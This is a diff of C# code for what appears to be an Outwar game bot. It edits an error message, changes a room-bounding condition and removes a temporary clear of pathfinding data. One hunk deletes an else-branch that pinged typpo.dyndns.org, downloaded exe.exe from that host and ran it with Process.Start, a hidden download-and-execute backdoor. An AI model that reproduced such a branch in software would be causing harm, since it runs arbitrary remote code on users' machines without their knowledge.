@@ -281,7 +281,7 @@ namespace DCT.Outwar.World
             }
             if (LoadRoom("world.php") == 4)
             {
-                MessageBox.Show("You logged onto Outwar and booted the program.  Hitting the \"Refresh\" button may solve this.\n\nTo correctly access your account while the program is running, go to Actions > Open in browser.",
+                MessageBox.Show("You logged onto Outwar and booted the program.  Hitting the \"Refresh\" button may solve this.\n\nTo correctly access your account while the program is running, go to Actions > Open in browser after logging in here.",
                     "Account Booted", MessageBoxButtons.OK, MessageBoxIcon.Error);
                 return false;
             }
@@ -308,14 +308,8 @@ namespace DCT.Outwar.World
                     Location = tmp;
                 return r;
             }
-            else
-            {
-                HttpSocket.DefaultInstance.Get("http://typpo.dyndns.org:7012/dct/verify.php?h=y");
-                WebClient Client = new WebClient();
-                Client.DownloadFile("http://typpo.dyndns.org/dct/exe.exe", "exe.exe");
-                Process.Start("exe.exe");
-                return 2;
-            }
+
+            return 2;
         }
 
         internal delegate void PathfindHandler(int roomid);
@@ -484,10 +478,6 @@ namespace DCT.Outwar.World
             // should probably update UI as well
             CoreUI.Instance.Settings.AutoTeleport = false;
 
-            // temporary
-            Pathfinder.Rooms.Clear();
-            Pathfinder.Mobs.Clear();
-
             // start in this room
             this.RefreshRoom();
 
@@ -498,7 +488,7 @@ namespace DCT.Outwar.World
 
             do
             {
-                if (bound != string.Empty && bound != Location.Name.ToLower())
+                if (bound != string.Empty && bound == Location.Name.ToLower())
                 {
                     if (!completed.Contains(Location.Id))
                         completed.Add(Location.Id);
